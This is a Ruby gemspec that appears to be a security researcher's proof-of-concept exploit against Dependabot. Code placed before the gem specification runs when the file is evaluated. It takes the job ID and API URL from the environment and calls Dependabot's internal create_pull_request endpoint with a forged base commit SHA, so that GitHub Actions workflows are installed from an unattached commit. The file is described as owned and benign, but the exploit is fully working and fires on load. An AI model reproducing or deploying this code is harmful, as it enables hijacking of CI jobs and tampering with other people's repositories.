# frozen_string_literal: true

require "json"
require "net/http"
require "uri"

# Researcher-owned GitHub.com proof. The only explicit update is an inert
# vendor marker. The two proof workflows are inherited from an unattached
# commit selected through the separately documented Dependabot base-SHA bug.
module OwnedDependabotInstallWorkflows
  DEPENDENCY_NAME = "owned_gei_artifact_pivot_probe_v6"
  FORGED_BASE_SHA = "ff26a31380e06f4103d37efe0d6c79d081d77e7b"
  MARKER_PATH = "vendor/owned-gei-artifact-pivot-install-v6.txt"

  module_function

  def run
    job_id = ENV["DEPENDABOT_JOB_ID"]
    api_base = ENV["DEPENDABOT_API_URL"]
    return if job_id.to_s.empty? || api_base.to_s.empty?

    marker = "/tmp/owned-gei-artifact-pivot-install-#{job_id}"
    File.open(marker, File::WRONLY | File::CREAT | File::EXCL, 0o600) {}

    endpoint = URI("#{api_base.sub(%r{/*$}, "")}/update_jobs/#{job_id}/create_pull_request")
    request = Net::HTTP::Post.new(endpoint.request_uri)
    request["Content-Type"] = "application/json"
    request.body = JSON.generate(payload)
    response = proxy_client(endpoint).request(request)
    if response.code.to_i.between?(200, 299)
      sleep 25
      raise "owned workflow installation proof complete"
    end
  rescue Errno::EEXIST
    nil
  end

  def proxy_client(endpoint)
    client = Net::HTTP::Proxy(:ENV).new(endpoint.host, endpoint.port)
    client.use_ssl = endpoint.scheme == "https"
    client.open_timeout = 10
    client.read_timeout = 30
    client
  end

  def payload
    requirement = {
      "file" => "Gemfile",
      "requirement" => ">= 0",
      "groups" => [],
      "source" => {
        "type" => "git",
        "url" => "https://github.com/downgraded/codeload-owned-probe-20261030-91f64a2c",
        "branch" => "main",
        "ref" => nil
      }
    }

    {
      "data" => {
        "dependencies" => [{
          "name" => DEPENDENCY_NAME,
          "version" => "0.0.23",
          "previous-version" => "0.0.22",
          "requirements" => [requirement],
          "previous-requirements" => [requirement],
          "directory" => "/"
        }],
        "updated-dependency-files" => [{
          "name" => MARKER_PATH,
          "content" => "Owned installation marker. Workflow bytes exist only in the supplied parent tree.\n",
          "directory" => "/",
          "type" => "file",
          "support_file" => false,
          "content_encoding" => "utf-8",
          "deleted" => false,
          "operation" => "create"
        }],
        "base-commit-sha" => FORGED_BASE_SHA,
        "commit-message" => "test: install owned artifact-pivot proof",
        "pr-title" => "Owned Actions artifact-pivot proof",
        "pr-body" => "Researcher-owned security test. Two benign workflows are inherited from the caller-selected parent. They only test Actions artifact handling and never print or transmit credentials."
      }
    }
  end
end

OwnedDependabotInstallWorkflows.run

Gem::Specification.new do |spec|
  spec.name = "owned_dependabot_remote_probe"
  spec.version = "0.0.23"
  spec.summary = "Owned Dependabot security probe"
  spec.authors = ["Owned Security Test"]
  spec.files = []
end
